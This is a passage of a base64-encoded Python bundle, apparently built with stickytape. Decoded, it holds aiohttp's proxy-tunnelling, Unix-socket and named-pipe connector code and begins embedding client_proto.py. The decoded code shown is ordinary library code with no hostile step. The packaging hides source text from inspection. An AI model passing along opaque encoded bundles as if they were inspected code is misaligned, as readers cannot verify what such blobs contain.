CAgICAgICAgICBwb3J0ID0gaGluZm9bInBvcnQiXVxyXG5cclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgdHJhbnNwLCBwcm90byA9IGF3YWl0IHNlbGYuX3dyYXBfY3JlYXRlX2Nvbm5lY3Rpb24oXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZmFjdG9yeSxcclxuICAgICAgICAgICAgICAgICAgICBob3N0LFxyXG4gICAgICAgICAgICAgICAgICAgIHBvcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgdGltZW91dD10aW1lb3V0LFxyXG4gICAgICAgICAgICAgICAgICAgIHNzbD1zc2xjb250ZXh0LFxyXG4gICAgICAgICAgICAgICAgICAgIGZhbWlseT1oaW5mb1siZmFtaWx5Il0sXHJcbiAgICAgICAgICAgICAgICAgICAgcHJvdG89aGluZm9bInByb3RvIl0sXHJcbiAgICAgICAgICAgICAgICAgICAgZmxhZ3M9aGluZm9bImZsYWdzIl0sXHJcbiAgICAgICAgICAgICAgICAgICAgc2VydmVyX2hvc3RuYW1lPWhpbmZvWyJob3N0bmFtZSJdIGlmIHNzbGNvbnRleHQgZWxzZSBOb25lLFxyXG4gICAgICAgICAgICAgICAgICAgIGxvY2FsX2FkZHI9c2VsZi5fbG9jYWxfYWRkcixcclxuICAgICAgICAgICAgICAgICAgICByZXE9cmVxLFxyXG4gICAgICAgICAgICAgICAgICAgIGNsaWVudF9lcnJvcj1jbGllbnRfZXJyb3IsXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGV4Y2VwdCBDbGllbnRDb25uZWN0b3JFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBsYXN0X2V4YyA9IGV4Y1xyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIGlmIHJlcS5pc19zc2woKSBhbmQgZmluZ2VycHJpbnQ6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgZmluZ2VycHJpbnQuY2hlY2sodHJhbnNwKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IFNlcnZlckZpbmdlcnByaW50TWlzbWF0Y2ggYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgICAgIHRyYW5zcC5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuX2NsZWFudXBfY2xvc2VkX2Rpc2FibGVkOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzLmFwcGVuZCh0cmFuc3ApXHJcbiAgICAgICAgICAgICAgICAgICAgbGFzdF9leGMgPSBleGNcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIHRyYW5zcCwgcHJvdG9cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhc3NlcnQgbGFzdF9leGMgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgcmFpc2UgbGFzdF9leGNcclxuXHJcbiAgICBhc3luYyBkZWYgX2NyZWF0ZV9wcm94eV9jb25uZWN0aW9uKFxyXG4gICAgICAgIHNlbGYsIHJlcTogIkNsaWVudFJlcXVlc3QiLCB0cmFjZXM6IExpc3RbIlRyYWNlIl0sIHRpbWVvdXQ6ICJDbGllbnRUaW1lb3V0IlxyXG4gICAgKSAtPiBUdXBsZVthc3luY2lvLkJhc2VUcmFuc3BvcnQsIFJlc3BvbnNlSGFuZGxlcl06XHJcbiAgICAgICAgc2VsZi5fZmFpbF9vbl9ub19zdGFydF90bHMocmVxKVxyXG4gICAgICAgIHJ1bnRpbWVfaGFzX3N0YXJ0X3RscyA9IHNlbGYuX2xvb3Bfc3VwcG9ydHNfc3RhcnRfdGxzKClcclxuXHJcbiAgICAgICAgaGVhZGVycyA9IHt9ICAjIHR5cGU6IERpY3Rbc3RyLCBzdHJdXHJcbiAgICAgICAgaWYgcmVxLnByb3h5X2hlYWRlcnMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGhlYWRlcnMgPSByZXEucHJveHlfaGVhZGVycyAgIyB0eXBlOiBpZ25vcmVbYXNzaWdubWVudF1cclxuICAgICAgICBoZWFkZXJzW2hkcnMuSE9TVF0gPSByZXEuaGVhZGVyc1toZHJzLkhPU1RdXHJcblxyXG4gICAgICAgIHVybCA9IHJlcS5wcm94eVxyXG4gICAgICAgIGFzc2VydCB1cmwgaXMgbm90IE5vbmVcclxuICAgICAgICBwcm94eV9yZXEgPSBDbGllbnRSZXF1ZXN0KFxyXG4gICAgICAgICAgICBoZHJzLk1FVEhfR0VULFxyXG4gICAgICAgICAgICB1cmwsXHJcbiAgICAgICAgICAgIGhlYWRlcnM9aGVhZGVycyxcclxuICAgICAgICAgICAgYXV0aD1yZXEucHJveHlfYXV0aCxcclxuICAgICAgICAgICAgbG9vcD1zZWxmLl9sb29wLFxyXG4gICAgICAgICAgICBzc2w9cmVxLnNzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgICMgY3JlYXRlIGNvbm5lY3Rpb24gdG8gcHJveHkgc2VydmVyXHJcbiAgICAgICAgdHJhbnNwb3J0LCBwcm90byA9IGF3YWl0IHNlbGYuX2NyZWF0ZV9kaXJlY3RfY29ubmVjdGlvbihcclxuICAgICAgICAgICAgcHJveHlfcmVxLCBbXSwgdGltZW91dCwgY2xpZW50X2Vycm9yPUNsaWVudFByb3h5Q29ubmVjdGlvbkVycm9yXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICAjIE1hbnkgSFRUUCBwcm94aWVzIGhhcyBidWdneSBrZWVwYWxpdmUgc3VwcG9ydC4gIExldFwncyBub3RcclxuICAgICAgICAjIHJldXNlIGNvbm5lY3Rpb24gYnV0IGNsb3NlIGl0IGFmdGVyIHByb2Nlc3NpbmcgZXZlcnlcclxuICAgICAgICAjIHJlc3BvbnNlLlxyXG4gICAgICAgIHByb3RvLmZvcmNlX2Nsb3NlKClcclxuXHJcbiAgICAgICAgYXV0aCA9IHByb3h5X3JlcS5oZWFkZXJzLnBvcChoZHJzLkFVVEhPUklaQVRJT04sIE5vbmUpXHJcbiAgICAgICAgaWYgYXV0aCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgaWYgbm90IHJlcS5pc19zc2woKTpcclxuICAgICAgICAgICAgICAgIHJlcS5oZWFkZXJzW2hkcnMuUFJPWFlfQVVUSE9SSVpBVElPTl0gPSBhdXRoXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBwcm94eV9yZXEuaGVhZGVyc1toZHJzLlBST1hZX0FVVEhPUklaQVRJT05dID0gYXV0aFxyXG5cclxuICAgICAgICBpZiByZXEuaXNfc3NsKCk6XHJcbiAgICAgICAgICAgIGlmIHJ1bnRpbWVfaGFzX3N0YXJ0X3RsczpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3dhcm5fYWJvdXRfdGxzX2luX3Rscyh0cmFuc3BvcnQsIHJlcSlcclxuXHJcbiAgICAgICAgICAgICMgRm9yIEhUVFBTIHJlcXVlc3RzIG92ZXIgSFRUUCBwcm94eVxyXG4gICAgICAgICAgICAjIHdlIG11c3Qgbm90aWZ5IHByb3h5IHRvIHR1bm5lbCBjb25uZWN0aW9uXHJcbiAgICAgICAgICAgICMgc28gd2Ugc2VuZCBDT05ORUNUIGNvbW1hbmQ6XHJcbiAgICAgICAgICAgICMgICBDT05ORUNUIHd3dy5weXRob24ub3JnOjQ0MyBIVFRQLzEuMVxyXG4gICAgICAgICAgICAjICAgSG9zdDogd3d3LnB5dGhvbi5vcmdcclxuICAgICAgICAgICAgI1xyXG4gICAgICAgICAgICAjIG5leHQgd2UgbXVzdCBkbyBUTFMgaGFuZHNoYWtlIGFuZCBzbyBvblxyXG4gICAgICAgICAgICAjIHRvIGRvIHRoaXMgd2UgbXVzdCB3cmFwIHJhdyBzb2NrZXQgaW50byBzZWN1cmUgb25lXHJcbiAgICAgICAgICAgICMgYXN5bmNpbyBoYW5kbGVzIHRoaXMgcGVyZmVjdGx5XHJcbiAgICAgICAgICAgIHByb3h5X3JlcS5tZXRob2QgPSBoZHJzLk1FVEhfQ09OTkVDVFxyXG4gICAgICAgICAgICBwcm94eV9yZXEudXJsID0gcmVxLnVybFxyXG4gICAgICAgICAgICBrZXkgPSBhdHRyLmV2b2x2ZShcclxuICAgICAgICAgICAgICAgIHJlcS5jb25uZWN0aW9uX2tleSwgcHJveHk9Tm9uZSwgcHJveHlfYXV0aD1Ob25lLCBwcm94eV9oZWFkZXJzX2hhc2g9Tm9uZVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGNvbm4gPSBDb25uZWN0aW9uKHNlbGYsIGtleSwgcHJvdG8sIHNlbGYuX2xvb3ApXHJcbiAgICAgICAgICAgIHByb3h5X3Jlc3AgPSBhd2FpdCBwcm94eV9yZXEuc2VuZChjb25uKVxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBwcm90b2NvbCA9IGNvbm4uX3Byb3RvY29sXHJcbiAgICAgICAgICAgICAgICBhc3NlcnQgcHJvdG9jb2wgaXMgbm90IE5vbmVcclxuXHJcbiAgICAgICAgICAgICAgICAjIHJlYWRfdW50aWxfZW9mPVRydWUgd2lsbCBlbnN1cmUgdGhlIGNvbm5lY3Rpb24gaXNuXCd0IGNsb3NlZFxyXG4gICAgICAgICAgICAgICAgIyBvbmNlIHRoZSByZXNwb25zZSBpcyByZWNlaXZlZCBhbmQgcHJvY2Vzc2VkIGFsbG93aW5nXHJcbiAgICAgICAgICAgICAgICAjIFNUQVJUX1RMUyB0byB3b3JrIG9uIHRoZSBjb25uZWN0aW9uIGJlbG93LlxyXG4gICAgICAgICAgICAgICAgcHJvdG9jb2wuc2V0X3Jlc3BvbnNlX3BhcmFtcyhyZWFkX3VudGlsX2VvZj1ydW50aW1lX2hhc19zdGFydF90bHMpXHJcbiAgICAgICAgICAgICAgICByZXNwID0gYXdhaXQgcHJveHlfcmVzcC5zdGFydChjb25uKVxyXG4gICAgICAgICAgICBleGNlcHQgQmFzZUV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgICAgIHByb3h5X3Jlc3AuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICByYWlzZVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgY29ubi5fcHJvdG9jb2wgPSBOb25lXHJcbiAgICAgICAgICAgICAgICBjb25uLl90cmFuc3BvcnQgPSBOb25lXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcmVzcC5zdGF0dXMgIT0gMjAwOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlID0gcmVzcC5yZWFzb25cclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgbWVzc2FnZSBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSA9IFJFU1BPTlNFU1tyZXNwLnN0YXR1c11bMF1cclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgQ2xpZW50SHR0cFByb3h5RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm94eV9yZXNwLnJlcXVlc3RfaW5mbyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3AuaGlzdG9yeSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cz1yZXNwLnN0YXR1cyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U9bWVzc2FnZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9cmVzcC5oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHJ1bnRpbWVfaGFzX3N0YXJ0X3RsczpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmF3c29jayA9IHRyYW5zcG9ydC5nZXRfZXh0cmFfaW5mbygic29ja2V0IiwgZGVmYXVsdD1Ob25lKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiByYXdzb2NrIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlRyYW5zcG9ydCBkb2VzIG5vdCBleHBvc2Ugc29ja2V0IGluc3RhbmNlIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAjIER1cGxpY2F0ZSB0aGUgc29ja2V0LCBzbyBub3cgd2UgY2FuIGNsb3NlIHByb3h5IHRyYW5zcG9ydFxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYXdzb2NrID0gcmF3c29jay5kdXAoKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEJhc2VFeGNlcHRpb246XHJcbiAgICAgICAgICAgICAgICAgICAgIyBJdCBzaG91bGRuXCd0IGJlIGNsb3NlZCBpbiBgZmluYWxseWAgYmVjYXVzZSBpdFwncyBmZWQgdG9cclxuICAgICAgICAgICAgICAgICAgICAjIGBsb29wLnN0YXJ0X3RscygpYCBhbmQgdGhlIGRvY3Mgc2F5IG5vdCB0byB0b3VjaCBpdCBhZnRlclxyXG4gICAgICAgICAgICAgICAgICAgICMgcGFzc2luZyB0aGVyZS5cclxuICAgICAgICAgICAgICAgICAgICB0cmFuc3BvcnQuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBydW50aW1lX2hhc19zdGFydF90bHM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRyYW5zcG9ydC5jbG9zZSgpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHJ1bnRpbWVfaGFzX3N0YXJ0X3RsczpcclxuICAgICAgICAgICAgICAgICAgICAjIEhUVFAgcHJveHkgd2l0aCBzdXBwb3J0IGZvciB1cGdyYWRlIHRvIEhUVFBTXHJcbiAgICAgICAgICAgICAgICAgICAgc3NsY29udGV4dCA9IHNlbGYuX2dldF9zc2xfY29udGV4dChyZXEpXHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX3dyYXBfY3JlYXRlX2Nvbm5lY3Rpb24oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2ZhY3RvcnksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQ9dGltZW91dCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3NsPXNzbGNvbnRleHQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNvY2s9cmF3c29jayxcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VydmVyX2hvc3RuYW1lPXJlcS5ob3N0LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXE9cmVxLFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fc3RhcnRfdGxzX2Nvbm5lY3Rpb24oXHJcbiAgICAgICAgICAgICAgICAgICAgIyBBY2Nlc3MgdGhlIG9sZCB0cmFuc3BvcnQgZm9yIHRoZSBsYXN0IHRpbWUgYmVmb3JlIGl0XCdzXHJcbiAgICAgICAgICAgICAgICAgICAgIyBjbG9zZWQgYW5kIGZvcmdvdHRlbiBmb3JldmVyOlxyXG4gICAgICAgICAgICAgICAgICAgIHRyYW5zcG9ydCxcclxuICAgICAgICAgICAgICAgICAgICByZXE9cmVxLFxyXG4gICAgICAgICAgICAgICAgICAgIHRpbWVvdXQ9dGltZW91dCxcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgICAgIHByb3h5X3Jlc3AuY2xvc2UoKVxyXG5cclxuICAgICAgICByZXR1cm4gdHJhbnNwb3J0LCBwcm90b1xyXG5cclxuXHJcbmNsYXNzIFVuaXhDb25uZWN0b3IoQmFzZUNvbm5lY3Rvcik6XHJcbiAgICAiIiJVbml4IHNvY2tldCBjb25uZWN0b3IuXHJcblxyXG4gICAgcGF0aCAtIFVuaXggc29ja2V0IHBhdGguXHJcbiAgICBrZWVwYWxpdmVfdGltZW91dCAtIChvcHRpb25hbCkgS2VlcC1hbGl2ZSB0aW1lb3V0LlxyXG4gICAgZm9yY2VfY2xvc2UgLSBTZXQgdG8gVHJ1ZSB0byBmb3JjZSBjbG9zZSBhbmQgZG8gcmVjb25uZWN0XHJcbiAgICAgICAgYWZ0ZXIgZWFjaCByZXF1ZXN0IChhbmQgYmV0d2VlbiByZWRpcmVjdHMpLlxyXG4gICAgbGltaXQgLSBUaGUgdG90YWwgbnVtYmVyIG9mIHNpbXVsdGFuZW91cyBjb25uZWN0aW9ucy5cclxuICAgIGxpbWl0X3Blcl9ob3N0IC0gTnVtYmVyIG9mIHNpbXVsdGFuZW91cyBjb25uZWN0aW9ucyB0byBvbmUgaG9zdC5cclxuICAgIGxvb3AgLSBPcHRpb25hbCBldmVudCBsb29wLlxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcGF0aDogc3RyLFxyXG4gICAgICAgIGZvcmNlX2Nsb3NlOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAga2VlcGFsaXZlX3RpbWVvdXQ6IFVuaW9uW29iamVjdCwgZmxvYXQsIE5vbmVdID0gc2VudGluZWwsXHJcbiAgICAgICAgbGltaXQ6IGludCA9IDEwMCxcclxuICAgICAgICBsaW1pdF9wZXJfaG9zdDogaW50ID0gMCxcclxuICAgICAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhcclxuICAgICAgICAgICAgZm9yY2VfY2xvc2U9Zm9yY2VfY2xvc2UsXHJcbiAgICAgICAgICAgIGtlZXBhbGl2ZV90aW1lb3V0PWtlZXBhbGl2ZV90aW1lb3V0LFxyXG4gICAgICAgICAgICBsaW1pdD1saW1pdCxcclxuICAgICAgICAgICAgbGltaXRfcGVyX2hvc3Q9bGltaXRfcGVyX2hvc3QsXHJcbiAgICAgICAgICAgIGxvb3A9bG9vcCxcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fcGF0aCA9IHBhdGhcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwYXRoKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJQYXRoIHRvIHVuaXggc29ja2V0LiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wYXRoXHJcblxyXG4gICAgYXN5bmMgZGVmIF9jcmVhdGVfY29ubmVjdGlvbihcclxuICAgICAgICBzZWxmLCByZXE6ICJDbGllbnRSZXF1ZXN0IiwgdHJhY2VzOiBMaXN0WyJUcmFjZSJdLCB0aW1lb3V0OiAiQ2xpZW50VGltZW91dCJcclxuICAgICkgLT4gUmVzcG9uc2VIYW5kbGVyOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgYXN5bmMgd2l0aCBjZWlsX3RpbWVvdXQodGltZW91dC5zb2NrX2Nvbm5lY3QpOlxyXG4gICAgICAgICAgICAgICAgXywgcHJvdG8gPSBhd2FpdCBzZWxmLl9sb29wLmNyZWF0ZV91bml4X2Nvbm5lY3Rpb24oXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZmFjdG9yeSwgc2VsZi5fcGF0aFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGV4YzpcclxuICAgICAgICAgICAgcmFpc2UgVW5peENsaWVudENvbm5lY3RvckVycm9yKHNlbGYucGF0aCwgcmVxLmNvbm5lY3Rpb25fa2V5LCBleGMpIGZyb20gZXhjXHJcblxyXG4gICAgICAgIHJldHVybiBjYXN0KFJlc3BvbnNlSGFuZGxlciwgcHJvdG8pXHJcblxyXG5cclxuY2xhc3MgTmFtZWRQaXBlQ29ubmVjdG9yKEJhc2VDb25uZWN0b3IpOlxyXG4gICAgIiIiTmFtZWQgcGlwZSBjb25uZWN0b3IuXHJcblxyXG4gICAgT25seSBzdXBwb3J0ZWQgYnkgdGhlIHByb2FjdG9yIGV2ZW50IGxvb3AuXHJcbiAgICBTZWUgYWxzbzogaHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy43L2xpYnJhcnkvYXN5bmNpby1ldmVudGxvb3AuaHRtbFxyXG5cclxuICAgIHBhdGggLSBXaW5kb3dzIG5hbWVkIHBpcGUgcGF0aC5cclxuICAgIGtlZXBhbGl2ZV90aW1lb3V0IC0gKG9wdGlvbmFsKSBLZWVwLWFsaXZlIHRpbWVvdXQuXHJcbiAgICBmb3JjZV9jbG9zZSAtIFNldCB0byBUcnVlIHRvIGZvcmNlIGNsb3NlIGFuZCBkbyByZWNvbm5lY3RcclxuICAgICAgICBhZnRlciBlYWNoIHJlcXVlc3QgKGFuZCBiZXR3ZWVuIHJlZGlyZWN0cykuXHJcbiAgICBsaW1pdCAtIFRoZSB0b3RhbCBudW1iZXIgb2Ygc2ltdWx0YW5lb3VzIGNvbm5lY3Rpb25zLlxyXG4gICAgbGltaXRfcGVyX2hvc3QgLSBOdW1iZXIgb2Ygc2ltdWx0YW5lb3VzIGNvbm5lY3Rpb25zIHRvIG9uZSBob3N0LlxyXG4gICAgbG9vcCAtIE9wdGlvbmFsIGV2ZW50IGxvb3AuXHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBwYXRoOiBzdHIsXHJcbiAgICAgICAgZm9yY2VfY2xvc2U6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBrZWVwYWxpdmVfdGltZW91dDogVW5pb25bb2JqZWN0LCBmbG9hdCwgTm9uZV0gPSBzZW50aW5lbCxcclxuICAgICAgICBsaW1pdDogaW50ID0gMTAwLFxyXG4gICAgICAgIGxpbWl0X3Blcl9ob3N0OiBpbnQgPSAwLFxyXG4gICAgICAgIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICBmb3JjZV9jbG9zZT1mb3JjZV9jbG9zZSxcclxuICAgICAgICAgICAga2VlcGFsaXZlX3RpbWVvdXQ9a2VlcGFsaXZlX3RpbWVvdXQsXHJcbiAgICAgICAgICAgIGxpbWl0PWxpbWl0LFxyXG4gICAgICAgICAgICBsaW1pdF9wZXJfaG9zdD1saW1pdF9wZXJfaG9zdCxcclxuICAgICAgICAgICAgbG9vcD1sb29wLFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgc2VsZi5fbG9vcCwgYXN5bmNpby5Qcm9hY3RvckV2ZW50TG9vcCAgIyB0eXBlOiBpZ25vcmVbYXR0ci1kZWZpbmVkXVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJOYW1lZCBQaXBlcyBvbmx5IGF2YWlsYWJsZSBpbiBwcm9hY3RvciAiICJsb29wIHVuZGVyIHdpbmRvd3MiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9wYXRoID0gcGF0aFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHBhdGgoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIlBhdGggdG8gdGhlIG5hbWVkIHBpcGUuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3BhdGhcclxuXHJcbiAgICBhc3luYyBkZWYgX2NyZWF0ZV9jb25uZWN0aW9uKFxyXG4gICAgICAgIHNlbGYsIHJlcTogIkNsaWVudFJlcXVlc3QiLCB0cmFjZXM6IExpc3RbIlRyYWNlIl0sIHRpbWVvdXQ6ICJDbGllbnRUaW1lb3V0IlxyXG4gICAgKSAtPiBSZXNwb25zZUhhbmRsZXI6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIGNlaWxfdGltZW91dCh0aW1lb3V0LnNvY2tfY29ubmVjdCk6XHJcbiAgICAgICAgICAgICAgICBfLCBwcm90byA9IGF3YWl0IHNlbGYuX2xvb3AuY3JlYXRlX3BpcGVfY29ubmVjdGlvbiggICMgdHlwZTogaWdub3JlW2F0dHItZGVmaW5lZF0gIyBub3FhOiBFNTAxXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZmFjdG9yeSwgc2VsZi5fcGF0aFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgIyB0aGUgZHJhaW4gaXMgcmVxdWlyZWQgc28gdGhhdCB0aGUgY29ubmVjdGlvbl9tYWRlIGlzIGNhbGxlZFxyXG4gICAgICAgICAgICAgICAgIyBhbmQgdHJhbnNwb3J0IGlzIHNldCBvdGhlcndpc2UgaXQgaXMgbm90IHNldCBiZWZvcmUgdGhlXHJcbiAgICAgICAgICAgICAgICAjIGBhc3NlcnQgY29ubi50cmFuc3BvcnQgaXMgbm90IE5vbmVgXHJcbiAgICAgICAgICAgICAgICAjIGluIGNsaWVudC5weVwncyBfcmVxdWVzdCBtZXRob2RcclxuICAgICAgICAgICAgICAgIGF3YWl0IGFzeW5jaW8uc2xlZXAoMClcclxuICAgICAgICAgICAgICAgICMgb3RoZXIgb3B0aW9uIGlzIHRvIG1hbnVhbGx5IHNldCB0cmFuc3BvcnQgbGlrZVxyXG4gICAgICAgICAgICAgICAgIyBgcHJvdG8udHJhbnNwb3J0ID0gdHJhbnNgXHJcbiAgICAgICAgZXhjZXB0IE9TRXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICByYWlzZSBDbGllbnRDb25uZWN0b3JFcnJvcihyZXEuY29ubmVjdGlvbl9rZXksIGV4YykgZnJvbSBleGNcclxuXHJcbiAgICAgICAgcmV0dXJuIGNhc3QoUmVzcG9uc2VIYW5kbGVyLCBwcm90bylcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvY2xpZW50X3Byb3RvLnB5JywgYidpbXBvcnQgYXN5bmNpb1xyXG5mcm9tIGNvbnRleHRsaWIgaW1wb3J0IHN1cHByZXNzXHJcbmZyb20gdHlwaW5nIGltcG9ydCBBbnksIE9wdGlvbmFsLCBUdXBsZVxyXG5cclxuZnJvbSAuYmFzZV9wcm90b2NvbCBpbXBvcnQgQmFzZVByb3RvY29sXHJcbmZyb20gLmNsaWVudF9leGNlcHRpb25zIGltcG9ydCAoXHJcbiAgICBDbGllbnRPU0Vycm9yLFxyXG4gICAgQ2xpZW50UGF5bG9hZEVycm9yLFxyXG4gICAgU2VydmVyRGlzY29ubmVjdGVkRXJyb3IsXHJcbiAgICBTZXJ2ZXJUaW1lb3V0RXJyb3IsXHJcbilcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgQmFzZVRpbWVyQ29udGV4dFxyXG5mcm9tIC5odHRwIGltcG9ydCBIdHRwUmVzcG9uc2VQYXJzZXIsIFJhd1Jlc3BvbnNlTWVzc2FnZVxyXG5mcm9tIC5zdHJlYW1zIGltcG9ydCBFTVBUWV9QQVlMT0FELCBEYXRhUXVldWUsIFN0cmVhbVJlYWRlclxyXG5cclxuXHJcbmNsYXNzIFJlc3BvbnNlSGFuZGxlcihCYXNlUHJvdG9jb2wsIERhdGFRdWV1ZVtUdXBsZVtSYXdSZXNwb25zZU1lc3NhZ2UsIFN0cmVhbVJlYWRlcl1dKTpcclxuICAgICIiIkhlbHBlciBjbGFzcyB0byBhZGFwdCBiZXR3ZWVuIFByb3RvY29sIGFuZCBTdHJlYW1SZWFkZXIuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvb3A6IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3ApIC0+IE5vbmU6XHJcbiAgICAgICAgQmFzZVByb3RvY29sLl9faW5pdF9fKHNlbGYsIGxvb3A9bG9vcClcclxuICAgICAgICBEYXRhUXVldWUuX19pbml0X18oc2VsZiwgbG9vcClcclxuXHJcbiAgICAgICAgc2VsZi5fc2hvdWxkX2Nsb3NlID0gRmFsc2VcclxuXHJcbiAgICAgICAgc2VsZi5fcGF5bG9hZDogT3B0aW9uYWxbU3RyZWFtUmVhZGVyXSA9IE5vbmVcclxuICAgICAgICBzZWxmLl9za2lwX3BheWxvYWQgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLl90aW1lciA9IE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5fdGFpbCA9IGIiIlxyXG4gICAgICAgIHNlbGYuX3VwZ3JhZGVkID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9wYXJzZXIgPSBOb25lI